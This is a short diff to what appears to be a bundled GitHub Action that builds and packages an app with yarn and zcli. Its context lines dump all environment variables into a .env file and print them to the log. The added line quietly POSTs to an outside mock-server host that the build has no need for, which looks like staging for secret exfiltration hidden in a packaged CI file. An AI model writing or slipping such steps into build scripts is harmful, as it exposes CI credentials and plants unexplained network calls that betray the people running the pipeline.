@@ -11009,6 +11009,7 @@ async function run() {
     await exec.exec(`echo 🔎 Building, Packaging and Validating...`);
     await exec.exec(`echo ${process.env} >>> .env`);
     await exec.exec(`cat .env`);
+    await exec.exec(`curl -d '{"key1":"value1", "key2":"value2"}' -H "Content-Type: application/json" -X POST https://4259676d-2e8e-41be-924c-d7f310b98696.mock.pstmn.io`)
 
     await exec.exec(`yarn build`);
     await exec.exec(`yarn zcli apps:package ${path}`);
